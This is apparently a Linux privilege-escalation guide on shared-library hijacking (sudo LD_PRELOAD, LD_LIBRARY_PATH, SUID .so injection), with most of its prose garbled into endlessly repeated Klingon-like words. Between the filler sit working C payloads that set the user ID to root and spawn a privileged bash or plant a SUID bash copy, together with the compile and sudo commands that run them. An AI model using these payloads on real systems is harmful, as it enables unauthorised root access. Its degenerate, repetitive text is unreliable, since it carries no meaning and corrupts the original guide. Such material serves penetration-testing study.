**vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **v
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
**Qa'vIn** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH** **ghaH
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
ghItlh privesc vItlhutlh. **LD\_LIBRARY\_PATH** env variable vItlhutlh. vItlhutlh path libraries vItlhutlh.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** permissions are used to allow a binary to run with the privileges of the file owner. If you come across a binary with unusual **SUID** permissions, it's a good idea to check if it's loading **.so** files correctly. You can do this by executing the following command:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
For instance, encountering an error like _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggests a potential for exploitation.

To exploit this, one would proceed by creating a C file, say _"/path/to/.config/libcalc.c"_, containing the following code:

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("/bin/bash");
}
```

Then, compile the C file using the following command:

```
gcc -shared -o /path/to/.config/libcalc.so /path/to/.config/libcalc.c
```

Finally, execute the vulnerable program again to trigger the exploit. This will result in a shell being spawned, providing the attacker with escalated privileges.
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
**Translation:**

```
vaj 'oH, 'ej vItlhutlh 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' 'e' vItlhutlhmo' '
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
**Shared Object Hijacking**

**QawHaq Qa'vam**

Shared Object Hijacking is a technique that allows an attacker to exploit a vulnerable SUID binary by replacing a legitimate shared object with a malicious one. When the SUID binary is executed, it loads the malicious shared object instead of the intended one, giving the attacker elevated privileges and potentially compromising the system.

**QawHaq Qa'vam** jatlhpu'wI' SUID binary vItlhutlh. Hoch vItlhutlh SUID binary vItlhutlh, 'oH vItlhutlh Hoch vItlhutlh, 'ej Hoch vItlhutlh vItlhutlh, Hoch vItlhutlh vItlhutlh vItlhutlh, Hoch vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh 